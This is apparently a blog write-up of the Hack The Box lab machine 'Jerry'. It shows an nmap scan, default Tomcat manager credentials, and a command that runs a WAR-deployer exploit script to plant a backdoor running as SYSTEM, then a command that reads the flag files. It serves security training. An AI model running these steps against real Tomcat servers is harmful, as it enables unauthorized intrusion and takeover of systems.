---
layout: single
title: "Jerry - Hacking Windows HTB Box "
categories: htb
classes: wide
---

Machine: Jerry
Ip: 10.10.10.95


Usually, First i perform all ports scanning
```bash
nmap -p- -v -T5 10.10.10.95
```
Nmap found only port 8080 open. Again scan to enumerate the version of it.

```bash
$ nmap -p8080 -sV -sC  -T5 10.10.10.95
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88


```

This version is vulnerable to war file upload( [CVE LINK](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617)). To exploit this we need creds info. 

I found the default creds in ```http://10.10.10.95/manager```:
```
Username: tomcat
Password: s3cret 
```

It was really easy machine to exploit. I found an awesome exploit script:
```
https://github.com/mgeeky/tomcatWarDeployer
```

Running this script as follows:
```
python tomcatWarDeployer.py.py -U tomcat -P s3cret -v 10.10.10.95:8080
```
![Exploiting Jerry](/images/jerry1.png)

And it upload a backdoor as system. So i was able to find all flags with following command:
```bat
cmd /c type c:\Users\Administrator\Desktop\flags\*.txt
```

Screenshot:
![Hacking Windows 2012 HTB Box jerry](/images/jerry-root.png)